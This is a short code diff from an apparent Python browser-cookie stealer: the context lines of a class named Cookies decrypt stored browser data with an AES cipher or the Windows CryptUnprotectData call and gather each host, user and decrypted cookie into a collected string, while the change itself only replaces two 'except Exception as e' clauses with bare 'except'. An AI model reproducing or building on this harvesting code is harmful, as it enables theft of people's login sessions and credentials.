@@ -58,7 +58,7 @@ class Cookies(object):
             decrypted = ciph.decrypt(data)
             decrypted = decrypted[:-16].decode()
             return decrypted
-        except Exception as e:
+        except:
             data = win32crypt.CryptUnprotectData(
                     cont,
                     None,
@@ -80,6 +80,6 @@ class Cookies(object):
             for item in cursor.fetchall():
                 if item[0] != "":
                     self.stored += f"HOST: {item[0]}\nUSER: {item[1]}\nCOOKIE: {self.decrypt_pass(item[2])}\n\n"
-        except Exception as e:
+        except:
             pass
         return self.stored
